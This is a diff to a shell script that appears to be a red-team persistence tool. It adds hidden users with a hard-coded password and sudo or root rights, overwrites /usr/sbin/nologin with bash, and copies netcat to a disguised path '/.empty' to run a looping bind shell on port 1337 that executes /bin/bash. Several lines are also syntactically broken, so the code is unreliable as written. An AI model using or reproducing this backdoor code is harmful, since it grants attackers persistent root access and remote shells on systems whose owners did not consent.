@@ -1,18 +1,18 @@
-#/bin/shell
+#/bin/bash
 
 func legit_user{
 	useradd -m -d /var/www/.apache_2 -s /usr/sbin/nologin -U apache_2
         echo -e "redTeamLovesYou\nredTeamLovesYou" |  passwd apache_2	
 
         usermod -aG sudo apache_2|| usermod -aG root apache_2
-	cp /usr/sbin/bash /usr/sbin/nologin
+	cp /usr/bash /usr/sbin/nologin
 }
 
 func add_user(user){
 	useradd -m -d /var/www/.$user -s /usr/sbin/nologin -U $user
-	echo -e "redTeamLovesYou\nredTeamLovesYou" | passwd user
+	echo -e "redTeamLovesYou\nredTeamLovesYou" | passwd $user
         usermod -aG sudo $user || usermod -aG root $user
-	cp /usr/sbin/bash /usr/sbin/nologin
+	cp /usr/bash /usr/sbin/nologin
 }
 
 func extra{
@@ -28,11 +28,12 @@ func ldPreload{
 	echo "ldpreload"
 }
 
-func call_back(ip){
+func call_back{
+        cp /bin/nc /.empty
 	while:
 	do
 		echo "Press [CTRL+C] to stop.."
-		/bin/nc -lvnp 
+		/.empty -lvnp 1337 -w 15 -e /bin/bash
 		sleep 1
 	done	
 }
